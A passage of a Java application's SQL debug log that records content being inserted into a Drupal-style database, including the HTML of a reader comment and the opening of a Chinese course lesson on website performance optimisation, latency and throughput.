<i class="iconfont"></i> <span></span> </div> <div class="_2P4B1Hdm_0"> <i class="iconfont"></i> 
<span class=""></span> </div> <!----> </div> </div> </div></li> <li class="reJj6Thl_0"><img 
src="https://static001.geekbang.org/account/avatar/00/14/34/df/64e3d533.jpg" class="_2273kGdT_0"> 
<div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> <a>leslie</a> 
<!----> </div> <div class="_1H1Z49Dr_0"> 2019-11-29 </div> </div> <!----> </div> <div> <div 
class="_3M6kV3zb_0"> 数据库如果需要做垂直拆分不少都是早期的设计上的坑：一口气吃成胖子或者没想到后期的扩展性，水平拆分倒是一种常态-数据量过大造成的。垂直拆分其实最被动：涉及到大量的代码修改；相对比而言水平拆分的代价就小许多。 
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Javascripe的坑有时同样蛮大的：故而其实如何合理使用任何一个部件需要整体的思考，否则经常容易把某个部件用爆了。 
</div> <div class="_2r3UB1GX_0"> <span>展开</span><i class="iconfont"></i> </div> <div class="_2xNIY4NG_0"> 
<p class="_33BLbmw4_0">作者回复: 关于拆分，我想补充的是，拆分有时候也是不可避免的，本来设计就是一个循序渐进的过程，最开始确实要避免过度设计。到后来随着业务的发展再来拆分也未必是一件坏事。</p> 
</div> <div class="_1w8H0ktn_0 _2A421P4G_0"> <div class="_2jsFl-X0_0"> <i class="iconfont"></i> 
<span></span> </div> <div class="_2P4B1Hdm_0"> <i class="iconfont"></i> <span class=""></span> 
</div> <!----> </div> </div> </div></li>', 0, 'full_html', 'zh-hans', 10, 10) 
 {executed in 4 msec}
2020-11-19 11:05:09.489 INFO  jdbc.sqltiming Line:373 - select bookfieldt0_.entity_id as entity_i1_8_, bookfieldt0_.bundle as bundle2_8_, bookfieldt0_.delta 
as delta3_8_, bookfieldt0_.langcode as langcode4_8_, bookfieldt0_.revision_id as revision5_8_, 
bookfieldt0_.field_thumb_value as field_th6_8_ from node__field_thumb bookfieldt0_ where bookfieldt0_.entity_id=10 
 {executed in 1 msec}
2020-11-19 11:05:09.489 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|----------|-------|------|---------|------------|------------------|

2020-11-19 11:05:09.490 INFO  jdbc.sqltiming Line:373 - select bookfieldt0_.entity_id as entity_i1_8_0_, bookfieldt0_.bundle as bundle2_8_0_, bookfieldt0_.delta 
as delta3_8_0_, bookfieldt0_.langcode as langcode4_8_0_, bookfieldt0_.revision_id as revision5_8_0_, 
bookfieldt0_.field_thumb_value as field_th6_8_0_ from node__field_thumb bookfieldt0_ where 
bookfieldt0_.entity_id=10 
 {executed in 0 msec}
2020-11-19 11:05:09.490 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|----------|-------|------|---------|------------|------------------|

2020-11-19 11:05:09.491 INFO  jdbc.sqltiming Line:373 - insert into node__field_thumb (bundle, delta, langcode, revision_id, field_thumb_value, entity_id) 
values ('book', 0, 'zh-hans', 10, 'https://static001.geekbang.org/resource/image/0b/3c/0bb59b047f373689d3060db985333e3c.jpg', 
10) 
 {executed in 0 msec}
2020-11-19 11:05:09.495 INFO  jdbc.sqltiming Line:373 - select nodefieldt0_.entity_id as entity_i1_17_0_, nodefieldt0_.bundle as bundle2_17_0_, nodefieldt0_.delta 
as delta3_17_0_, nodefieldt0_.langcode as langcode4_17_0_, nodefieldt0_.revision_id as revision5_17_0_, 
nodefieldt0_.field_thumb_value as field_th6_17_0_ from node_revision__field_thumb nodefieldt0_ 
where nodefieldt0_.entity_id=10 
 {executed in 0 msec}
2020-11-19 11:05:09.496 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|----------|-------|------|---------|------------|------------------|

2020-11-19 11:05:09.497 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_thumb (bundle, delta, langcode, revision_id, field_thumb_value, 
entity_id) values ('book', 0, 'zh-hans', 10, 'https://static001.geekbang.org/resource/image/0b/3c/0bb59b047f373689d3060db985333e3c.jpg', 
10) 
 {executed in 0 msec}
2020-11-19 11:05:09.512 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_5_0_, bookfieldf0_.bundle as bundle2_5_0_, bookfieldf0_.delta 
as delta3_5_0_, bookfieldf0_.field_fenlei_target_id as field_fe4_5_0_, bookfieldf0_.langcode 
as langcode5_5_0_, bookfieldf0_.revision_id as revision6_5_0_ from node__field_fenlei bookfieldf0_ 
where bookfieldf0_.entity_id=10 
 {executed in 0 msec}
2020-11-19 11:05:09.513 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------------|---------|------------|
|entity_id |bundle |delta |field_fenlei_target_id |langcode |revision_id |
|----------|-------|------|-----------------------|---------|------------|
|----------|-------|------|-----------------------|---------|------------|

2020-11-19 11:05:09.514 INFO  jdbc.sqltiming Line:373 - insert into node__field_fenlei (bundle, delta, field_fenlei_target_id, langcode, revision_id, 
entity_id) values ('book', 0, 1, 'zh-hans', 10, 10) 
 {executed in 0 msec}
2020-11-19 11:05:09.520 INFO  jdbc.sqltiming Line:373 - select nodefieldf0_.entity_id as entity_i1_14_0_, nodefieldf0_.bundle as bundle2_14_0_, nodefieldf0_.delta 
as delta3_14_0_, nodefieldf0_.field_fenlei_target_id as field_fe4_14_0_, nodefieldf0_.langcode 
as langcode5_14_0_, nodefieldf0_.revision_id as revision6_14_0_ from node_revision__field_fenlei 
nodefieldf0_ where nodefieldf0_.entity_id=10 
 {executed in 0 msec}
2020-11-19 11:05:09.520 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------------|---------|------------|
|entity_id |bundle |delta |field_fenlei_target_id |langcode |revision_id |
|----------|-------|------|-----------------------|---------|------------|
|----------|-------|------|-----------------------|---------|------------|

2020-11-19 11:05:09.521 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_fenlei (bundle, delta, field_fenlei_target_id, langcode, revision_id, 
entity_id) values ('book', 0, 1, 'zh-hans', 10, 10) 
 {executed in 0 msec}
2020-11-19 11:05:45.061 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_6_, bookfieldf0_.bundle as bundle2_6_, bookfieldf0_.delta 
as delta3_6_, bookfieldf0_.field_fsid_value as field_fs4_6_, bookfieldf0_.langcode as langcode5_6_, 
bookfieldf0_.revision_id as revision6_6_ from node__field_fsid bookfieldf0_ where bookfieldf0_.field_fsid_value='686719975135178' 
 {executed in 1 msec}
2020-11-19 11:05:45.062 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|----------|-------|------|-----------------|---------|------------|

2020-11-19 11:05:45.067 INFO  jdbc.sqltiming Line:373 - insert into node_revision (langcode, nid, revision_default, revision_timestamp, revision_uid) 
values ('zh-hans', 0, 1, 1605755145, 1) 
 {executed in 2 msec}
2020-11-19 11:05:45.067 INFO  jdbc.sqltiming Line:373 - getGeneratedKeys on query: insert into node_revision (langcode, nid, revision_default, revision_timestamp, 
revision_uid) values ('zh-hans', 0, 1, 1605755145, 1) 
 {executed in 0 msec}
2020-11-19 11:05:45.068 INFO  jdbc.resultsettable Line:610 - 
|--------------|
|generated_key |
|--------------|
|11            |
|--------------|

2020-11-19 11:05:45.075 INFO  jdbc.sqltiming Line:373 - insert into node (langcode, type, uuid, vid) values ('zh-hans', 'book', '6fd02cf9-a230-4437-9505-d9d626ab9626', 
11) 
 {executed in 0 msec}
2020-11-19 11:05:45.076 INFO  jdbc.sqltiming Line:373 - getGeneratedKeys on query: insert into node (langcode, type, uuid, vid) values ('zh-hans', 
'book', '6fd02cf9-a230-4437-9505-d9d626ab9626', 11) 
 {executed in 0 msec}
2020-11-19 11:05:45.076 INFO  jdbc.resultsettable Line:610 - 
|--------------|
|generated_key |
|--------------|
|11            |
|--------------|

2020-11-19 11:05:45.080 INFO  jdbc.sqltiming Line:373 - update node_revision set langcode='zh-hans', nid=11, revision_default=1, revision_timestamp=1605755145, 
revision_uid=1 where vid=11 
 {executed in 0 msec}
2020-11-19 11:05:45.084 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_6_0_, bookfieldf0_.bundle as bundle2_6_0_, bookfieldf0_.delta 
as delta3_6_0_, bookfieldf0_.field_fsid_value as field_fs4_6_0_, bookfieldf0_.langcode as langcode5_6_0_, 
bookfieldf0_.revision_id as revision6_6_0_ from node__field_fsid bookfieldf0_ where bookfieldf0_.entity_id=11 
 {executed in 0 msec}
2020-11-19 11:05:45.085 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|----------|-------|------|-----------------|---------|------------|

2020-11-19 11:05:45.086 INFO  jdbc.sqltiming Line:373 - insert into node__field_fsid (bundle, delta, field_fsid_value, langcode, revision_id, entity_id) 
values ('book', 0, '686719975135178', 'zh-hans', 11, 11) 
 {executed in 0 msec}
2020-11-19 11:05:45.092 INFO  jdbc.sqltiming Line:373 - select nodefieldf0_.entity_id as entity_i1_15_0_, nodefieldf0_.bundle as bundle2_15_0_, nodefieldf0_.delta 
as delta3_15_0_, nodefieldf0_.field_fsid_value as field_fs4_15_0_, nodefieldf0_.langcode as 
langcode5_15_0_, nodefieldf0_.revision_id as revision6_15_0_ from node_revision__field_fsid 
nodefieldf0_ where nodefieldf0_.entity_id=11 
 {executed in 0 msec}
2020-11-19 11:05:45.093 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|----------|-------|------|-----------------|---------|------------|

2020-11-19 11:05:45.094 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_fsid (bundle, delta, field_fsid_value, langcode, revision_id, 
entity_id) values ('book', 0, '686719975135178', 'zh-hans', 11, 11) 
 {executed in 1 msec}
2020-11-19 11:05:45.098 INFO  jdbc.sqltiming Line:373 - select bookentity0_.nid as nid1_1_, bookentity0_.bid as bid2_1_, bookentity0_.depth as depth3_1_, 
bookentity0_.has_children as has_chil4_1_, bookentity0_.p1 as p5_1_, bookentity0_.p2 as p6_1_, 
bookentity0_.p3 as p7_1_, bookentity0_.p4 as p8_1_, bookentity0_.p5 as p9_1_, bookentity0_.pid 
as pid10_1_, bookentity0_.weight as weight11_1_ from book bookentity0_ where bookentity0_.nid=11 
 {executed in 0 msec}
2020-11-19 11:05:45.098 INFO  jdbc.resultsettable Line:610 - 
|----|----|------|-------------|---|---|---|---|---|----|-------|
|nid |bid |depth |has_children |p1 |p2 |p3 |p4 |p5 |pid |weight |
|----|----|------|-------------|---|---|---|---|---|----|-------|
|----|----|------|-------------|---|---|---|---|---|----|-------|

2020-11-19 11:05:45.099 INFO  jdbc.sqltiming Line:373 - select bookentity0_.nid as nid1_1_0_, bookentity0_.bid as bid2_1_0_, bookentity0_.depth as 
depth3_1_0_, bookentity0_.has_children as has_chil4_1_0_, bookentity0_.p1 as p5_1_0_, bookentity0_.p2 
as p6_1_0_, bookentity0_.p3 as p7_1_0_, bookentity0_.p4 as p8_1_0_, bookentity0_.p5 as p9_1_0_, 
bookentity0_.pid as pid10_1_0_, bookentity0_.weight as weight11_1_0_ from book bookentity0_ 
where bookentity0_.nid=11 
 {executed in 0 msec}
2020-11-19 11:05:45.100 INFO  jdbc.resultsettable Line:610 - 
|----|----|------|-------------|---|---|---|---|---|----|-------|
|nid |bid |depth |has_children |p1 |p2 |p3 |p4 |p5 |pid |weight |
|----|----|------|-------------|---|---|---|---|---|----|-------|
|----|----|------|-------------|---|---|---|---|---|----|-------|

2020-11-19 11:05:45.101 INFO  jdbc.sqltiming Line:373 - insert into book (bid, depth, has_children, p1, p2, p3, p4, p5, pid, weight, nid) values (1, 
3, 0, 1, 4, 11, 0, 0, 4, 0, 11) 
 {executed in 0 msec}
2020-11-19 11:05:45.107 INFO  jdbc.sqltiming Line:373 - select nodebodyen0_.entity_id as entity_i1_3_, nodebodyen0_.body_value as body_val2_3_, nodebodyen0_.body_summary 
as body_sum3_3_, nodebodyen0_.bundle as bundle4_3_, nodebodyen0_.delta as delta5_3_, nodebodyen0_.body_format 
as body_for6_3_, nodebodyen0_.langcode as langcode7_3_, nodebodyen0_.revision_id as revision8_3_ 
from node__body nodebodyen0_ where nodebodyen0_.entity_id=11 
 {executed in 0 msec}
2020-11-19 11:05:45.107 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 11:05:45.108 INFO  jdbc.sqltiming Line:373 - select nodebodyre0_.entity_id as entity_i1_12_0_, nodebodyre0_.body_value as body_val2_12_0_, 
nodebodyre0_.body_summary as body_sum3_12_0_, nodebodyre0_.bundle as bundle4_12_0_, nodebodyre0_.delta 
as delta5_12_0_, nodebodyre0_.body_format as body_for6_12_0_, nodebodyre0_.langcode as langcode7_12_0_, 
nodebodyre0_.revision_id as revision8_12_0_ from node_revision__body nodebodyre0_ where nodebodyre0_.entity_id=11 
 {executed in 0 msec}
2020-11-19 11:05:45.108 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 11:05:45.111 INFO  jdbc.sqltiming Line:373 - insert into node_revision__body (body_value, body_summary, bundle, delta, body_format, langcode, 
revision_id, entity_id) values ('<div data-slate-editor="true" data-key="334" autocorrect="off" 
spellcheck="false" data-gramm="false" style="outline: none; white-space: pre-wrap; overflow-wrap: 
break-word;"> <div class="se-06c70855 " data-slate-type="paragraph" data-slate-object="block" 
data-key="335"> <span data-slate-object="text" data-key="336"><span data-slate-leaf="true" 
data-offset-key="336:0" data-first-offset="true"><span data-slate-string="true">你好，我是四火。</span></span></span> 
</div> <div class="se-a431d854 " data-slate-type="paragraph" data-slate-object="block" data-key="337"> 
<span data-slate-object="text" data-key="338"><span data-slate-leaf="true" data-offset-key="338:0" 
data-first-offset="true"><span data-slate-string="true">从今天开始我们进入“专题”这一章，本章的内容会涉及一些不适合单独归纳到前面任何一章的话题，比如这一讲和下一讲，我们来聊一聊网站的性能优化。</span></span></span> 
</div> <div class="se-a9892de7 " data-slate-type="paragraph" data-slate-object="block" data-key="339"> 
<span data-slate-object="text" data-key="340"><span data-slate-leaf="true" data-offset-key="340:0" 
data-first-offset="true"><span data-slate-string="true">具体说，在这两讲性能专题中，第一讲我将介绍性能优化的基本知识，包括性能优化和软件设计的关系，性能指标和关注点，以及怎样去寻找性能瓶颈，这些是我们需要优先明确、分析和思考的内容，而不是没头没脑地直接跳进问题的坑去“优化”；而第二讲则要讲真正的“优化”了，我将从产品和架构调整，后端和持久层优化，以及前端和网络层优化这样三个方面结合例子来介绍具体的性能优化技术。</span></span></span> 
</div> <h2 class="se-107c6776" data-slate-type="heading" data-slate-object="block" data-key="341"><span 
data-slate-object="text" data-key="342"><span data-slate-leaf="true" data-offset-key="342:0" 
data-first-offset="true"><span data-slate-string="true">性能优化与软件设计</span></span></span></h2> 
<div class="se-7b0df438 " data-slate-type="paragraph" data-slate-object="block" data-key="343"> 
<span data-slate-object="text" data-key="344"><span data-slate-leaf="true" data-offset-key="344:0" 
data-first-offset="true"><span data-slate-string="true">在最开始的部分，我想明确最重要的一件事——也许你已经听说过这句话——“</span></span></span><span 
data-slate-object="text" data-key="345"><span data-slate-leaf="true" data-offset-key="345:0" 
data-first-offset="true"><span class="se-7f60d9c1" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">好的性能是设计出来的，而不是优化出来的</span></span></span></span><span data-slate-object="text" 
data-key="346"><span data-slate-leaf="true" data-offset-key="346:0" data-first-offset="true"><span 
data-slate-string="true">”。这就像是“高质量的软件是设计出来的，而不是测试出来的”一样，强调的都是软件设计的地位。因此，在设计阶段不考虑性能，而寄希望于在上线前后通过集中式的性能优化突击来将网站性能提高到另一个层次，往往是主次颠倒的。</span></span></span> 
</div> <div class="se-eb5e965e " data-slate-type="paragraph" data-slate-object="block" data-key="347"> 
<span data-slate-object="text" data-key="348"><span data-slate-leaf="true" data-offset-key="348:0" 
data-first-offset="true"><span data-slate-string="true">我来举一个实际的例子说明下这一点吧。</span></span></span> 
</div> <div class="se-ba15a0de " data-slate-type="paragraph" data-slate-object="block" data-key="349"> 
<span data-slate-object="text" data-key="350"><span data-slate-leaf="true" data-offset-key="350:0" 
data-first-offset="true"><span data-slate-string="true">在我参加工作不久后，曾经参与过的一个项目，用户的所有读写操作都要入库，当时的设计是把这样的数据放到关系数据库一个用户行为的表中，以供后续的查阅。上线以后，由于用户量大，操作频繁，很快这张表就变得巨大，读写的性能瓶颈都在这张表上，而且所有用户的操作都受到了影响，因为所有的操作都要写入这张表，在这时我被卷入这个项目，希望尽快解决这个性能问题。说实话，最初设计的时候没有考虑好，而这时候要做小修小改来解决这个功能的性能问题，是比较困难的。</span></span></span> 
</div> <div class="se-7d2bb6c7 " data-slate-type="paragraph" data-slate-object="block" data-key="351"> 
<span data-slate-object="text" data-key="352"><span data-slate-leaf="true" data-offset-key="352:0" 
data-first-offset="true"><span data-slate-string="true">具体来说，如果在设计阶段，这里其实是有很多可以考虑的因素的，它们都可以帮助提前介入这个性能隐患的分析和解决：</span></span></span> 
</div> <div class="se-46e0b985 " data-slate-type="paragraph" data-slate-object="block" data-key="353"> 
<span data-slate-object="text" data-key="354"><span data-slate-leaf="true" data-offset-key="354:0" 
data-first-offset="true"><span class="se-051fb9a7" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">产品设计角度</span></span></span></span><span data-slate-object="text" data-key="355"><span 
data-slate-leaf="true" data-offset-key="355:0" data-first-offset="true"><span data-slate-string="true">，用户的行为分为读操作和写操作，我们知道写操作通常更为重要，那用户的读操作是否有那么重要，可不可以只记录写操作？这样的数据有多重要，丢失的代价有多大，数据保密性是怎样的？这决定了一致性要求和数据存储在客户端是否可能。历史数据是怎样消费的，即数据访问模型是怎样的，那个时候 
NoSQL 还没有兴起，但是如果不需要复杂的关系查询，这里还是可以有很大的优化空间的。</span></span></span> </div> <div class="se-b6b96a7b 
" data-slate-type="paragraph" data-slate-object="block" data-key="356"> <span data-slate-object="text" 
data-key="357"><span data-slate-leaf="true" data-offset-key="357:0" data-first-offset="true"><span 
class="se-9e6be6b3" data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">技术实现角度</span></span></span></span><span 
data-slate-object="text" data-key="358"><span data-slate-leaf="true" data-offset-key="358:0" 
data-first-offset="true"><span data-slate-string="true">，能否以某种方式保留最近的若干条记录即可？这将允许某一种方式进行定期的数据淘汰、清理和归档。归档文件的组织形式又和数据访问模型有关，因为归档文件不支持任意的关系查询，那该怎样去支持特定的业务查询模型呢？比如将较老的记录归档到以用户 
ID 和时间打散的历史文件中去，目的都是保证表的大小可控。哪怕是面对最糟糕的看似没有办法的“窘境”，只要预先考虑到了，我们还有对于数据库表进行 sharding 或者 partition 
这样的看似“不优雅”，但是也能解决问题的通用方法。</span></span></span> </div> <div class="se-7d0cda62 " data-slate-type="paragraph" 
data-slate-object="block" data-key="359"> <span data-slate-object="text" data-key="360"><span 
data-slate-leaf="true" data-offset-key="360:0" data-first-offset="true"><span data-slate-string="true">上面我举了几个对于该性能问题的“优化”可以考虑的方面，但相信你也看到了，与其说这些手段是“优化”，倒不如说是“设计”。当时那个项目，我们被迫加班加点，周末时间顶着客户不满赶工出一个线上的临时处理方案来缓解问题，并最终花了一周时间重构这部分设计，才算彻底地解决了这个问题。</span></span></span> 
</div> <div class="se-1737d94b " data-slate-type="paragraph" data-slate-object="block" data-key="361"> 
<span data-slate-object="text" data-key="362"><span data-slate-leaf="true" data-offset-key="362:0" 
data-first-offset="true"><span data-slate-string="true">这个教训是深刻的，</span></span></span><span 
data-slate-object="text" data-key="363"><span data-slate-leaf="true" data-offset-key="363:0" 
data-first-offset="true"><span class="se-8479366c" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">从工程上看，整个设计、开发、测试到运维一系列的步骤里面，我们总是不得不至少在某一个步骤做到足够细致和周全，这里的细致指的是深度，而周全则意味着广度。</span></span></span></span> 
</div> <div class="se-4d155b98 " data-slate-type="paragraph" data-slate-object="block" data-key="364"> 
<span data-slate-object="text" data-key="365"><span data-slate-leaf="true" data-offset-key="365:0" 
data-first-offset="true"><span data-slate-string="true">最理想的情况当然是在产品设计阶段就意识到这个问题，但是这也是最难的；如果产品设计阶段做不到，那么开发实现阶段，开发人员通过深入的思考就能够意识到这个问题；如果开发阶段做不到，在测试阶段如果可以进行细致和周全的思考，也可以发现这个问题；如果测试阶段还没有做到，那就只好等着上线以后，问题发生来打脸了。当然，这里面的代价是随着工程流程向后进行而递增的。</span></span></span> 
</div> <div class="se-5c60ae7e " data-slate-type="paragraph" data-slate-object="block" data-key="366"> 
<span data-slate-object="text" data-key="367"><span data-slate-leaf="true" data-offset-key="367:0" 
data-first-offset="true"><span data-slate-string="true">到这里，我想你应该理解了为什么说“好的性能是设计出来的”，但是说说容易做却难。如果由于种种原因，我们还是遇到了需要在项目的中后期，来做性能优化的情况，那么这时候，我们可以遵循这样三条原则来进行：</span></span></span> 
</div> <div class="se-14f4bd94" data-slate-type="list" data-slate-object="block" data-key="368"> 
<div class="se-5447f470 se-51d28ac1" data-slate-type="list-line" data-slate-object="block" 
data-key="369"> <span data-slate-object="text" data-key="370"><span data-slate-leaf="true" 
data-offset-key="370:0" data-first-offset="true"><span data-slate-string="true">问题定位，出现性能瓶颈，定位清楚问题的原因，是进行后面优化工作的前提；</span></span></span> 
</div> <div class="se-e20996e4 se-00660223" data-slate-type="list-line" data-slate-object="block" 
data-key="371"> <span data-slate-object="text" data-key="372"><span data-slate-leaf="true" 
data-offset-key="372:0" data-first-offset="true"><span data-slate-string="true">问题解决，有时候问题比较棘手，我们可能会将解决方案划分为临时方案和长期方案，分别进行；</span></span></span> 
</div> <div class="se-46bc9ead se-9cfb526c" data-slate-type="list-line" data-slate-object="block" 
data-key="373"> <span data-slate-object="text" data-key="374"><span data-slate-leaf="true" 
data-offset-key="374:0" data-first-offset="true"><span data-slate-string="true">问题泛化，这指的是将解决一个问题泛化到更大的维度上，比如项目中还有没有类似的隐患？能不能总结经验以供未来的其他开发人员学习？这些是为了提高对未发生问题的预见性。</span></span></span> 
</div> </div> <h2 class="se-f6c3220e" data-slate-type="heading" data-slate-object="block" data-key="375"><span 
data-slate-object="text" data-key="376"><span data-slate-leaf="true" data-offset-key="376:0" 
data-first-offset="true"><span data-slate-string="true">性能指标与关注点</span></span></span></h2> 
<div class="se-069af350 " data-slate-type="paragraph" data-slate-object="block" data-key="377"> 
<span data-slate-object="text" data-key="378"><span data-slate-leaf="true" data-offset-key="378:0" 
data-first-offset="true"><span data-slate-string="true">在我们从产品经理手里拿到产品设计文档的时候，性能指标就应当有一定程度的明确了。性能指标基本上包含两个大类，一个是从业务角度定义的，另一个是从资源角度定义的。</span></span></span> 
</div> <div class="se-44412908 " data-slate-type="paragraph" data-slate-object="block" data-key="379"> 
<span data-slate-object="text" data-key="380"><span data-slate-leaf="true" data-offset-key="380:0" 
data-first-offset="true"><span data-slate-string="true">通常产品经理给的需求或设计文档中，就应当包含一些关键的业务角度定义的性能指标了，但是资源角度的性能指标，产品经理通常不怎么关心。一般说来，比如我们</span></span></span><span 
data-slate-object="text" data-key="381"><span data-slate-leaf="true" data-offset-key="381:0" 
data-first-offset="true"><span class="se-9d93f5b4" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">最关心的性能指标，也往往就是从业务角度定义的，它可以说是“越高越好”；而资源角度，程序员有时考虑的却是“越低越好”，有时则是“达标就好”。</span></span></span></span> 
</div> <h3 class="se-c1b2a334" data-slate-type="heading" data-slate-object="block" data-key="382"><span 
data-slate-object="text" data-key="383"><span data-slate-leaf="true" data-offset-key="383:0" 
data-first-offset="true"><span data-slate-string="true">1. 业务角度</span></span></span></h3> <div 
class="se-9e27e55b " data-slate-type="paragraph" data-slate-object="block" data-key="384"> 
<span data-slate-object="text" data-key="385"><span data-slate-leaf="true" data-offset-key="385:0" 
data-first-offset="true"><span data-slate-string="true">你可以回想一下 </span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="386" class="se-bd361ee3 se-f81bfce9"><span data-slate-object="text" 
data-key="387"><span data-slate-leaf="true" data-offset-key="387:0" data-first-offset="true"><span 
data-slate-string="true">[第 21 讲]</span></span></span></a><span data-slate-object="text" data-key="388"><span 
data-slate-leaf="true" data-offset-key="388:0" data-first-offset="true"><span data-slate-string="true">，我们在那时就介绍了缓存的使用动机，就是节约开销。这和性能指标的关注点如出一辙，既包括延迟（latency）和吞吐量（throughput），这两个同时往往也是业务角度最重要的性能指标，又包括资源消耗，这也完全符合前面说的资源角度。</span></span></span> 
</div> <div class="se-a54947a0 " data-slate-type="paragraph" data-slate-object="block" data-key="389"> 
<span data-slate-object="text" data-key="390"><span data-slate-leaf="true" data-offset-key="390:0" 
data-first-offset="true"><span data-slate-string="true">延迟和吞吐量，这两个指标往往是应用性能评估中最重要的两个。先来明确二者的定义：延迟，其实就是响应时间，指的是客户端发送请求以后，到收到该请求的响应，中间需要的时间消耗；而吞吐量，指的是系统处理请求的速率，反映的是单位时间内处理请求的能力。</span></span></span> 
</div> <div class="se-1183fbf6 " data-slate-type="paragraph" data-slate-object="block" data-key="391"> 
<span data-slate-object="text" data-key="392"><span data-slate-leaf="true" data-offset-key="392:0" 
data-first-offset="true"><span data-slate-string="true">一般说来，</span></span></span><span data-slate-object="text" 
data-key="393"><span data-slate-leaf="true" data-offset-key="393:0" data-first-offset="true"><span 
class="se-d4e57950" data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">延迟和吞吐量是既互斥、又相辅相成的关系。</span></span></span></span><span 
data-slate-object="text" data-key="394"><span data-slate-leaf="true" data-offset-key="394:0" 
data-first-offset="true"><span data-slate-string="true">一图胜千言，且看这个典型例子（下图来自</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="395" class="se-bd361ee3 se-f81bfce9"><span 
data-slate-object="text" data-key="396"><span data-slate-leaf="true" data-offset-key="396:0" 
data-first-offset="true"><span data-slate-string="true">这篇文章</span></span></span></a><span 
data-slate-object="text" data-key="397"><span data-slate-leaf="true" data-offset-key="397:0" 
data-first-offset="true"><span data-slate-string="true">，这个图因很有典型意义而被到处转载）：</span></span></span> 
</div> <div class="se-66b862d9" data-slate-type="image" data-slate-object="block" data-key="398"> 
<img class="se-49761d8e" src="https://static001.geekbang.org/resource/image/69/f8/6925e8b275b09943c3f6918bc8d1f4f8.png"> 
</div> <div class="se-59ea6d73 " data-slate-type="paragraph" data-slate-object="block" data-key="399"> 
<span data-slate-object="text" data-key="400"><span data-slate-leaf="true" data-offset-key="400:0" 
data-first-offset="true"><span data-slate-string="true">总体来说，随着压力的增大，同等时间内应用被调用的次数增加，我们可以发现这样几个规律：</span></span></span> 
</div> <div class="se-ed41b03f" data-slate-type="list" data-slate-object="block" data-key="401"> 
<div class="se-43b7508b se-f2bf9d25" data-slate-type="list-line" data-slate-object="block" 
data-key="402"> <span data-slate-object="text" data-key="403"><span data-slate-leaf="true" 
data-offset-key="403:0" data-first-offset="true"><span class="se-03704314" data-slate-type="bold" 
data-slate-object="mark"><span data-slate-string="true">单独观察 Latency 曲线，延迟总是非递减的。一开始延迟可以说几乎不变，到了某一个特定的值（转折点）以后，延迟突然迅速增大。</span></span></span></span> 
</div> <div class="se-f420fa9b se-340cf1a5" data-slate-type="list-line" data-slate-object="block" 
data-key="404"> <span data-slate-object="text" data-key="405"><span data-slate-leaf="true" 
data-offset-key="405:0" data-first-offset="true"><span class="se-22238eb6" data-slate-type="bold" 
data-slate-object="mark"><span data-slate-string="true">再来单独观察 Throughput 曲线，吞吐量总是一个先线性增大，后来增长减缓，到达峰值后逐渐减小的过程。</span></span></span></span> 
</div> <div class="se-977df12e se-7bcb59c8" data-slate-type="list-line" data-slate-object="block" 
data-key="406"> <span data-slate-object="text" data-key="407"><span data-slate-leaf="true" 
data-offset-key="407:0" data-first-offset="true"><span data-slate-string="true">再把两者结合起来观察，延迟曲线前面提到的那个转折点，和吞吐量的最高点，通常在一个比较接近的位置上，并且</span></span></span><span 
data-slate-object="text" data-key="408"><span data-slate-leaf="true" data-offset-key="408:0" 
data-first-offset="true"><span class="se-40c9ee77" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">延迟的转折点往往要略先于吞吐量的最高点出现</span></span></span></span><span data-slate-object="text" 
data-key="409"><span data-slate-leaf="true" data-offset-key="409:0" data-first-offset="true"><span 
data-slate-string="true">。</span></span></span> </div> </div> <div class="se-82e6ca2b " data-slate-type="paragraph" 
data-slate-object="block" data-key="410"> <span data-slate-object="text" data-key="411"><span 
